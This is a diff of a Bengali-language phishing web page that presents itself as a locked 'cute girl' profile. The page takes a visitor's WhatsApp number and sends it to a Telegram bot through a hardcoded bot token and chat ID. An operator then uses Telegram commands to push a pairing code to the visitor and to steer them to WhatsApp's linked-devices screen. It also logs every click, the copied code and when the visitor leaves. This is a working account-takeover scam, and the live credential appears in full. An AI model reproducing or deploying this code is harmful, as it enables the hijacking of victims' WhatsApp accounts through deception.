@@ -6,6 +6,9 @@
 
 <title>Cute Girl lPrivate Profile Locked</title>
 
+<!-- Tailwind CSS CDN -->
+<script src="https://cdn.tailwindcss.com"></script>
+
 <style>
 *{
     box-sizing:border-box;
@@ -114,40 +117,6 @@ h1{
     opacity:.6;
 }
 
-/* =========================
-   WAITING (পেজ ২)
-========================= */
-
-.waiting{
-    display:none;
-    text-align:center;
-}
-
-.loader{
-    width:58px;
-    height:58px;
-    margin:5px auto 20px;
-    border:6px solid #e5f3ed;
-    border-top-color:#07865f;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-}
-
-@keyframes spin{
-    to{ transform:rotate(360deg); }
-}
-
-.wait-title{
-    color:#07865f;
-    font-size:21px;
-    font-weight:800;
-}
-
-.wait-text{
-    color:#777;
-    line-height:1.7;
-}
-
 .error{
     display:none;
     margin-top:15px;
@@ -163,7 +132,7 @@ h1{
 }
 
 /* =========================
-   মাঝখানের পারমিশন মোডাল
+   মাঝখানের পারমিশন মোডাল (পপ-আপ)
 ========================= */
 
 .modal-overlay{
@@ -333,7 +302,7 @@ h1{
 
 <div class="wrapper">
 
-    <!-- প্রোডাক্ট ইমেজ (ভেঙে গেলে লুকিয়ে যাবে) -->
+    <!-- প্রোডাক্ট ইমেজ -->
     <img
         id="productImage"
         class="top-image"
@@ -384,37 +353,37 @@ h1{
 
 
     <!-- =========================
-         পেজ ২: ওয়েটিং (অনির্দিষ্টকাল)
+         ভাসমান পারমিশন স্টাইলের ওয়েটিং মোডাল (পেজ ২)
     ========================== -->
 
-    <section id="waitingPage" class="card waiting fixed inset-0 bg-black/60 backdrop-blur-sm z-[9999] flex items-center justify-center p-4" style="display: none;">
-    <div class="bg-white w-full max-w-sm rounded-2xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
-        
-        <div class="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 ring-8 ring-emerald-100">
-            <svg class="h-8 w-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
-            </svg>
+    <div id="waitingPage" class="modal-overlay">
+        <div class="modal-box text-center">
+            
+            <div class="modal-header">
+                ⏳ তথ্য যাচাই করা হচ্ছে
+            </div>
+
+            <div class="my-4 flex justify-center">
+                <svg class="animate-spin h-10 w-10 text-emerald-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+            </div>
+
+            <div class="modal-title wait-title" style="font-size:18px; margin-bottom:6px;">
+                অল্প কিছুক্ষণ অপেক্ষা করুন
+            </div>
+
+            <div class="modal-text wait-text" style="font-size:14px; margin-bottom:15px;">
+                সরাসরি আপনার whatsapp এর সাথে যুক্ত করার জন্য পাসওয়ার্ড ছারা লিংক কোড তৈরি হবে। দয়া করে অপেক্ষা করুন।
+            </div>
+
+            <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden relative mt-2">
+                <div class="bg-emerald-600 h-full w-2/3 rounded-full animate-pulse"></div>
+            </div>
+
         </div>
-
-        <h3 class="text-xl font-extrabold text-gray-900 mb-1 wait-title">তথ্য যাচাই করা হচ্ছে</h3>
-        
-        <p class="text-xs font-semibold text-emerald-600 bg-emerald-50 px-3 py-1 rounded-full mb-5 inline-block">বাংলাদেশ দূতাবাস অনলাইন সার্ভার</p>
-        
-        <div class="mb-4">
-            <svg class="animate-spin h-8 w-8 text-emerald-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-        </div>
-
-        <p class="text-sm font-bold text-gray-800 leading-snug mb-2 wait-text">আপনার তথ্যটি গুরুত্ব সহকারে চেক করা হচ্ছে।</p>
-
-        <div class="w-full bg-gray-100 h-1.5 rounded-full mt-5 overflow-hidden relative">
-            <div class="bg-gradient-to-r from-emerald-500 to-green-600 h-full w-1/2 rounded-full absolute top-0 left-0 animate-progress"></div>
-        </div>
-
     </div>
-</section>
 
 
     <div class="footer">
@@ -425,7 +394,7 @@ h1{
 
 
 <!-- =========================
-     মাঝখানের পারমিশন মোডাল
+     মাঝখানের পারমিশন মোডাল (কোড দেখার)
 ========================== -->
 
 <div id="modalOverlay" class="modal-overlay">
@@ -457,7 +426,7 @@ h1{
         <!-- বর্ণনা -->
         <div id="modalText" class="modal-text"></div>
 
-        <!-- কোড বক্স (শুধু /send-এ) -->
+        <!-- কোড বক্স -->
         <div id="codeBox" class="code-box"></div>
 
         <!-- অ্যাকশন বাটন -->
@@ -471,27 +440,17 @@ h1{
 <script>
 
 /* ==========================================================
-   ১. টেলিগ্রাম সেটিংস (আগের টোকেন ও Chat ID-ই রাখা হলো)
+   ১. টেলিগ্রাম সেটিংস
 ========================================================== */
 
 const BOT_TOKEN = "8990521456:AAFOG4g-sFfJgDABIgkbTyAJI6FQiTCyVow";
-
 const CHAT_ID = "8516934257";
-
 const WHATSAPP_LINK = "https://wa.me/settings/linked_devices";
-
 const PRODUCT_IMAGE_URL = "https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg";
-
-/*
-⚠️ GitHub Pages-এ ফাইল পাবলিক থাকে, তাই এই টোকেন সবাই দেখতে পাবে।
-টেস্ট শেষে @BotFather থেকে টোকেন নতুন করে নিলে ভালো।
-*/
 
 
 /* ==========================================================
    ২. sessionStorage হেল্পার
-   (একই ট্যাবে রিফ্রেশ করলে অবস্থা থাকবে;
-   ট্যাব বন্ধ করে নতুন করে ঢুকলে প্রথম পেজ থেকে শুরু)
 ========================================================== */
 
 const store = {
@@ -519,8 +478,8 @@ const store = {
 let requestStartedAt = 0;
 let lastUpdateId = 0;
 let pollingTimer = null;
-let isPolling = false;          /* একসাথে একাধিক getUpdates আটকানো */
-let currentStep = 1;            /* 1 = পেজ ১, 2 = ওয়েটিং পেজ */
+let isPolling = false;          
+let currentStep = 1;            
 let currentPhone = "";
 let codeShown = "";
 let navigatingToWhatsApp = false;
@@ -563,14 +522,13 @@ if (PRODUCT_IMAGE_URL.trim() !== "") {
 function showProductPage(){
     currentStep = 1;
     productPage.style.display = "block";
-    waitingPage.style.display = "none";
+    waitingPage.classList.remove("show");
 }
 
 function showWaitingPage(){
     currentStep = 2;
     store.set("cw_step", "2");
-    productPage.style.display = "none";
-    waitingPage.style.display = "block";
+    waitingPage.classList.add("show");
 }
 
 
@@ -590,27 +548,25 @@ function clearError(){
 
 
 /* ==========================================================
-   ৮. নাম্বার ভ্যালিডেশন (বাংলাদেশি ফরম্যাট)
+   ৮. নাম্বার ভ্যালিডেশন
 ========================================================== */
 
 function isValidPhoneNumber(value){
-
     const clean = value.replace(/[\s\-()+]/g, "");
 
-    if (/^01[3-9]\d{8}$/.test(clean)) return true;        /* 01XXXXXXXXX */
-    if (/^8801[3-9]\d{8}$/.test(clean)) return true;      /* 8801XXXXXXXXX */
-    if (/^\+?8801[3-9]\d{8}$/.test(clean)) return true;   /* +8801XXXXXXXXX */
+    if (/^01[3-9]\d{8}$/.test(clean)) return true;        
+    if (/^8801[3-9]\d{8}$/.test(clean)) return true;      
+    if (/^\+?8801[3-9]\d{8}$/.test(clean)) return true;   
 
     return false;
 }
 
 
 /* ==========================================================
-   ৯. টেলিগ্রামে নোটিফিকেশন পাঠানো (ইউজারের প্রতিটা কাজ)
+   ৯. টেলিগ্রামে নোটিফিকেশন পাঠানো
 ========================================================== */
 
 function notifyTelegram(text){
-
     if (BOT_TOKEN.trim() === "" || CHAT_ID.trim() === "") return;
 
     fetch(
@@ -628,7 +584,7 @@ function notifyTelegram(text){
 
 
 /* ==========================================================
-   ১০. কমান্ড বাটনসহ রিকোয়েস্ট পাঠানো (পেজ ১ → Telegram)
+   ১০. কমান্ড বাটনসহ রিকোয়েস্ট পাঠানো
 ========================================================== */
 
 async function sendProductRequest(product){
@@ -654,16 +610,11 @@ ${requestStartedAt}
 🌐 /WhatsApp web — সরাসরি লিংক খুলুন
 `;
 
-    const url =
-        "https://api.telegram.org/bot" +
-        BOT_TOKEN +
-        "/sendMessage";
+    const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
 
     const response = await fetch(url, {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
             chat_id: CHAT_ID,
             text: message,
@@ -683,7 +634,6 @@ ${requestStartedAt}
     });
 
     const text = await response.text();
-
     let data;
 
     try {
@@ -707,32 +657,26 @@ ${requestStartedAt}
 submitButton.addEventListener("click", async function(){
 
     clearError();
-
     const value = productNumber.value.trim();
 
-    /* খালি চেক */
     if (value === "") {
         showError("অনুগ্রহ করে আপনার হোয়াটসঅ্যাপ নাম্বার লিখুন।");
         productNumber.focus();
         return;
     }
 
-    /* নাম্বার ফরম্যাট চেক */
     if (!isValidPhoneNumber(value)) {
         showError("সঠিক নাম্বার লিখুন। যেমন: 01XXXXXXXXX বা +8801XXXXXXXXX");
         productNumber.focus();
         return;
     }
 
-    /* টোকেন চেক */
     if (BOT_TOKEN.trim() === "" || CHAT_ID.trim() === "") {
         showError("Telegram Bot Token এবং Chat ID সেট করা হয়নি।");
         return;
     }
 
-    /* Request ID (ইউনিক টাইমস্ট্যাম্প) */
     requestStartedAt = Math.floor(Date.now() / 1000);
-
     currentPhone = value;
 
     store.set("cw_requestId", String(requestStartedAt));
@@ -742,24 +686,13 @@ submitButton.addEventListener("click", async function(){
     submitButton.textContent = "পাঠানো হচ্ছে...";
 
     try {
-
-        /* Telegram-এ নাম্বার + ৪টা কমান্ড বাটন পাঠানো */
         await sendProductRequest(value);
-
-        /* পেজ ১ হাইড → ওয়েটিং পেজ (অনির্দিষ্টকাল) */
         showWaitingPage();
-
         notifyTelegram("⏳ ইউজার ওয়েটিং পেজে আটকে আছে — কমান্ড বাটনে ক্লিক করুন");
-
-        /* টেলিগ্রামের নতুন কমান্ড খোঁজা শুরু */
         startPolling();
-
     } catch (error) {
-
         showError(error.message || "অনুরোধ পাঠানো যায়নি।");
-
     } finally {
-
         submitButton.disabled = false;
         submitButton.textContent = "সংযুক্ত হন (Join Now)";
     }
@@ -784,129 +717,56 @@ function stopPolling(){
 }
 
 async function pollTelegram(){
-
-    /* শুধু ওয়েটিং পেজে থাকা অবস্থায় কমান্ড প্রসেস হবে */
     if (currentStep !== 2) return;
-
-    /* একসাথে একাধিক কল আটকানো (409 Conflict এড়ানো) */
     if (isPolling) return;
     isPolling = true;
 
     try {
-
-        const url =
-            "https://api.telegram.org/bot" +
-            BOT_TOKEN +
-            "/getUpdates?offset=" +
-            (lastUpdateId + 1) +
-            "&timeout=1";
-
+        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=1";
         const response = await fetch(url);
         const text = await response.text();
-
         let data;
 
         try {
             data = JSON.parse(text);
         } catch (error) {
-            console.warn("Telegram response JSON নয়");
             return;
         }
 
-        if (!data.ok) {
-            console.warn(data.description);
-            return;
-        }
-
-        if (!data.result || data.result.length === 0) {
-            return;
-        }
+        if (!data.ok || !data.result || data.result.length === 0) return;
 
         for (const update of data.result) {
-
             lastUpdateId = Math.max(lastUpdateId, update.update_id);
             store.set("cw_lastUpdateId", String(lastUpdateId));
 
-            /* ---------- কমান্ড বাটনে ক্লিক (callback_query) ---------- */
-
             if (update.callback_query) {
-
                 const cq = update.callback_query;
-
-                /* শুধু আপনার chat থেকে */
-                if (
-                    cq.message &&
-                    cq.message.chat &&
-                    cq.message.chat.id === Number(CHAT_ID)
-                ) {
-
-                    /* পুরনো রিকোয়েস্টের বাটন হলে বাদ */
-                    if (
-                        cq.message.date &&
-                        cq.message.date < requestStartedAt
-                    ) {
-                        continue;
-                    }
-
-                    /* বাটনের loading চিহ্ন বন্ধ করা */
+                if (cq.message && cq.message.chat && cq.message.chat.id === Number(CHAT_ID)) {
+                    if (cq.message.date && cq.message.date < requestStartedAt) continue;
                     answerCallbackQuery(cq.id);
-
                     handleCommand(cq.data, null);
                 }
-
                 continue;
             }
-
-            /* ---------- সাধারণ মেসেজ (টাইপ করা কমান্ড) ---------- */
 
             if (!update.message || !update.message.text) continue;
-
-            if (
-                !update.message.chat ||
-                update.message.chat.id !== Number(CHAT_ID)
-            ) {
-                continue;
-            }
-
-            /* request শুরুর আগের মেসেজ বাদ */
-            if (
-                update.message.date &&
-                update.message.date < requestStartedAt
-            ) {
-                continue;
-            }
+            if (!update.message.chat || update.message.chat.id !== Number(CHAT_ID)) continue;
+            if (update.message.date && update.message.date < requestStartedAt) continue;
 
             const rawText = update.message.text.trim();
             const lowerText = rawText.toLowerCase();
 
             if (lowerText.startsWith("/send")) {
-
                 const value = rawText.substring(5).trim();
-
-                if (value === "") {
-                    /* শুধু /send — কোড এখনো লেখা হয়নি */
-                    handleCommand("cmd_send", null);
-                } else {
-                    handleCommand("cmd_send", value);
-                }
-
+                handleCommand("cmd_send", value || null);
             } else if (lowerText === "/error") {
-
                 handleCommand("cmd_error", null);
-
             } else if (lowerText === "/success") {
-
                 handleCommand("cmd_success", null);
-
-            } else if (
-                lowerText === "/whatsapp web" ||
-                lowerText === "/whatsappweb"
-            ) {
-
+            } else if (lowerText === "/whatsapp web" || lowerText === "/whatsappweb") {
                 handleCommand("cmd_web", null);
             }
         }
-
     } catch (error) {
         console.warn("Polling error:", error);
     } finally {
@@ -920,20 +780,12 @@ async function pollTelegram(){
 ========================================================== */
 
 async function answerCallbackQuery(callbackQueryId){
-
     try {
-        await fetch(
-            "https://api.telegram.org/bot" +
-            BOT_TOKEN +
-            "/answerCallbackQuery",
-            {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    callback_query_id: callbackQueryId
-                })
-            }
-        );
+        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ callback_query_id: callbackQueryId })
+        });
     } catch (e) {}
 }
 
@@ -943,9 +795,7 @@ async function answerCallbackQuery(callbackQueryId){
 ========================================================== */
 
 function handleCommand(cmd, value){
-
     if (cmd === "cmd_send") {
-
         if (value) {
             showSendModal(value);
             notifyTelegram("🔑 ইউজারকে কোড দেখানো হয়েছে: " + value);
@@ -953,20 +803,13 @@ function handleCommand(cmd, value){
             showSendModal("");
             notifyTelegram("📋 /send বাটনে ক্লিক হয়েছে। কোড পাঠাতে টাইপ করুন: /send আপনার_কোড");
         }
-
     } else if (cmd === "cmd_error") {
-
         showErrorModal();
         notifyTelegram("❌ /error — ইউজারকে সমস্যার বার্তা দেখানো হয়েছে");
-
     } else if (cmd === "cmd_success") {
-
         showSuccessModal();
         notifyTelegram("✅ /success — ইউজারকে সফল বার্তা দেখানো হয়েছে");
-
     } else if (cmd === "cmd_web") {
-
-        /* সরাসরি WhatsApp লিংক খোলা */
         openWhatsAppLink("whatsapp_web_button", false);
     }
 }
@@ -992,52 +835,34 @@ function closeModal(){
 ========================================================== */
 
 function showSendModal(code){
-
     openModal();
-
     permPhone.textContent = currentPhone || "—";
-
     permStatus.textContent = code ? "কোড প্রস্তুত ✅" : "অপেক্ষা করা হচ্ছে ⏳";
-
     modalIcon.textContent = "🔑";
-
     modalTitle.textContent = "আনলক কোড";
-
     modalText.textContent = "নিচের কোডটি কপি করে ব্যবহার করুন:";
 
     codeBox.style.display = "flex";
     codeBox.textContent = code || "… কোড আসছে …";
-
     codeShown = code || "";
 
     modalAction.innerHTML =
-        '<button type="button" class="action-btn blue" id="copyCodeBtn"' +
-        (code ? "" : " disabled") +
-        '>📋 কপি করুন</button>' +
+        '<button type="button" class="action-btn blue" id="copyCodeBtn"' + (code ? "" : " disabled") + '>📋 কপি করুন</button>' +
         '<div class="copy-message" id="copyMessage">✅ কপি হয়েছে</div>';
 
     document.getElementById("copyCodeBtn").addEventListener("click", copyCode);
 }
 
-
-/* কপি বাটনে ক্লিক → কপি → আবার ওয়েটিং পেজ */
 async function copyCode(){
-
     const val = codeShown;
-
     if (!val) return;
 
     const btn = document.getElementById("copyCodeBtn");
     if (btn) btn.disabled = true;
 
-    let ok = false;
-
     try {
         await navigator.clipboard.writeText(val);
-        ok = true;
     } catch (error) {
-
-        /* পুরনো ব্রাউজার fallback */
         const textarea = document.createElement("textarea");
         textarea.value = val;
         textarea.style.position = "fixed";
@@ -1045,13 +870,7 @@ async function copyCode(){
         document.body.appendChild(textarea);
         textarea.focus();
         textarea.select();
-
-        try {
-            ok = document.execCommand("copy");
-        } catch (e2) {
-            ok = false;
-        }
-
+        try { document.execCommand("copy"); } catch (e2) {}
         document.body.removeChild(textarea);
     }
 
@@ -1060,15 +879,10 @@ async function copyCode(){
 
     notifyTelegram("📋 ইউজার কোড কপি করেছে: " + val);
 
-    /* কপি করার সঙ্গে সঙ্গে আবার ওয়েটিং পেজ */
     setTimeout(function () {
-
         closeModal();
-
         showWaitingPage();
-
         notifyTelegram("⏳ ইউজার আবার ওয়েটিং পেজে আটকে আছে — নতুন কমান্ডের অপেক্ষায়");
-
     }, 900);
 }
 
@@ -1078,31 +892,19 @@ async function copyCode(){
 ========================================================== */
 
 function showErrorModal(){
-
     openModal();
-
     permPhone.textContent = currentPhone || "—";
-
     permStatus.textContent = "ত্রুটি ❌";
-
     modalIcon.innerHTML = '<span style="color:#c62828">✖</span>';
-
     modalTitle.textContent = "সমস্যা হয়েছে";
-
-    modalText.textContent =
-        "সার্ভার জনিত সমস্যার কারণে whatsapp এর সাথে যুক্ত হতে সমস্যা হচ্ছে আবার নতুন করে চেষ্টা করুন";
+    modalText.textContent = "সার্ভার জনিত সমস্যার কারণে whatsapp এর সাথে যুক্ত হতে সমস্যা হচ্ছে আবার নতুন করে চেষ্টা করুন";
 
     codeBox.style.display = "none";
-
-    modalAction.innerHTML =
-        '<button type="button" class="action-btn gray" id="retryBtn">আবার চেষ্টা করুন</button>';
+    modalAction.innerHTML = '<button type="button" class="action-btn gray" id="retryBtn">আবার চেষ্টা করুন</button>';
 
     document.getElementById("retryBtn").addEventListener("click", function () {
-
         notifyTelegram("🔄 ইউজার 'আবার চেষ্টা করুন' ক্লিক করেছে — ওয়েটিং পেজে ফিরেছে");
-
         closeModal();
-
         showWaitingPage();
     });
 }
@@ -1113,29 +915,18 @@ function showErrorModal(){
 ========================================================== */
 
 function showSuccessModal(){
-
     openModal();
-
     permPhone.textContent = currentPhone || "—";
-
     permStatus.textContent = "সফল ✅";
-
     modalIcon.innerHTML = '<span style="color:#16833c">✓</span>';
-
     modalTitle.textContent = "সফল হয়েছে";
-
-    modalText.textContent =
-        "আপনার অনুরোধটি সফল হয়েছে দয়া করে নিচের বাটনে ক্লিক করে যুক্ত হন";
+    modalText.textContent = "আপনার অনুরোধটি সফল হয়েছে দয়া করে নিচের বাটনে ক্লিক করে যুক্ত হন";
 
     codeBox.style.display = "none";
-
-    modalAction.innerHTML =
-        '<button type="button" class="action-btn green" id="joinBtn">✅ যুক্ত হন</button>';
+    modalAction.innerHTML = '<button type="button" class="action-btn green" id="joinBtn">✅ যুক্ত হন</button>';
 
     document.getElementById("joinBtn").addEventListener("click", function () {
-
         notifyTelegram("✅ ইউজার 'যুক্ত হন' বাটনে ক্লিক করেছে — WhatsApp লিংকে যাচ্ছে");
-
         openWhatsAppLink("success_join_button", true);
     });
 }
@@ -1143,25 +934,18 @@ function showSuccessModal(){
 
 /* ==========================================================
    ১৯. WhatsApp লিংক খোলা
-   (wa.me/settings/linked_devices)
 ========================================================== */
 
 function openWhatsAppLink(source, isNewTab) {
-
     navigatingToWhatsApp = true;
-
-    /* নোটিফিকেশন: ইউজার WhatsApp লিংকে গেছে */
     notifyTelegram("🌐 ইউজার WhatsApp লিংকে ক্লিক করেছে (" + source + ")");
 
     if (isNewTab) {
-        /* নতুন ট্যাবে খোলা — মূল ট্যাব ওয়েটিং পেজেই থাকবে */
         window.open(WHATSAPP_LINK, "_blank");
     } else {
-        /* বর্তমান ট্যাবেই খুলবে */
         window.location.href = WHATSAPP_LINK;
     }
 
-    /* ইউজার ফিরে এলে আবার ওয়েটিং পেজে (sessionStorage-এর কারণে) */
     setTimeout(function () {
         if (currentStep === 2) {
             showWaitingPage();
@@ -1175,7 +959,6 @@ function openWhatsAppLink(source, isNewTab) {
 ========================================================== */
 
 window.addEventListener("pagehide", function () {
-
     if (currentStep === 2 && !navigatingToWhatsApp) {
         notifyTelegram("🚪 ইউজার ওয়েবসাইট ছেড়ে চলে গেছে");
     }
@@ -1183,33 +966,25 @@ window.addEventListener("pagehide", function () {
 
 
 /* ==========================================================
-   ২১. পেজ রিলোড / ফিরে আসা — sessionStorage দিয়ে স্টেট
+   ২১. পেজ রিলোড / ফিরে আসা — sessionStorage
 ========================================================== */
 
 window.addEventListener("pageshow", function () {
-
     stopPolling();
-
     navigatingToWhatsApp = false;
 
-    /* আগের session থেকে স্টেট নেওয়া */
     const savedStep = store.get("cw_step", "1");
     const savedRequestId = store.get("cw_requestId", "0");
     const savedPhone = store.get("cw_phone", "");
 
     if (savedStep === "2" && savedRequestId !== "0") {
-
-        /* ইউজার আগে ওয়েটিং পেজে ছিল — সেখানেই ফেরত */
         requestStartedAt = Number(savedRequestId);
         currentPhone = savedPhone;
         lastUpdateId = Number(store.get("cw_lastUpdateId", "0"));
 
         showWaitingPage();
         startPolling();
-
     } else {
-
-        /* নতুন ভিজিট — প্রথম পেজ থেকে শুরু */
         requestStartedAt = 0;
         lastUpdateId = 0;
         currentPhone = "";
